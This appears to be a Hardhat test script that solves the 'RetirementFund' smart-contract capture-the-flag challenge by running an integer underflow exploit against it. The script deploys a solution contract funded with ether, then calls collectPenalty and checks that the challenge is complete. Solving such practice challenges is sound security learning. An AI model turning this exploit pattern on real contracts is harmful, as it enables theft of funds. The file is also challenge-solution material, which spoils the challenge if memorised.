import { expect } from 'chai';
import { ethers } from 'hardhat';
import { etherToWei } from '../utils';

describe('RetirementFund', function () {
  it('should exploit an underflow vulnerability', async function () {
    const challengeAddress = '0x4C15C2dDec6222CD04D8828C6929CB77F97E93Ab';

    const Challenge = await ethers.getContractFactory('RetirementFund');
    const challenge = Challenge.attach(challengeAddress);

    const Solution = await ethers.getContractFactory('SolutionRetirementFund');
    const solution = await Solution.deploy(challenge.address, {
      value: etherToWei(0.0001),
    });
    await solution.deployed();

    const tx = await challenge.collectPenalty();
    await tx.wait();

    expect(await challenge.isComplete()).to.be.true;
  });
});
